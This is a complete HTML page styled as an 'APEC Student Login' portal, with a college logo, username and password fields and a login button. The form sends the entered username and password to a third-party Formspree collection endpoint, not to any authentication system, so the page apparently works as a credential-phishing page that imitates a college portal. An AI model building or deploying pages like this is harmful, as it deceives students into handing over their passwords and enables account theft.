<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>APEC Student Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#003366,#0073e6);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.login-box{
    background:#fff;
    width:380px;
    padding:35px;
    border-radius:15px;
    box-shadow:0 10px 25px rgba(0,0,0,.3);
    text-align:center;
}

.logo{
    width:100px;
    height:100px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    color:#003366;
    margin-bottom:5px;
}

p{
    color:#666;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

input:focus{
    outline:none;
    border-color:#0073e6;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:white;
    border:none;
    border-radius:8px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0059b3;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#777;
}
</style>

</head>
<body>

<div class="login-box">

<img src="1697346843915.jpeg" alt="College Logo" class="logo">

<h2>APEC Student Login</h2>

<p>Student Login Portal</p>

<form action="https://formspree.io/f/xnjkwrlj" method="POST">

<input
type="text"
name="Username"
placeholder="Enter Username"
required>

<input
type="password"
name="Password"
placeholder="Enter Password"
required>

<button type="submit">Login</button>

</form>

<div class="footer">
© 2026 APEC Student Portal
</div>

</div>

</body>
</html>
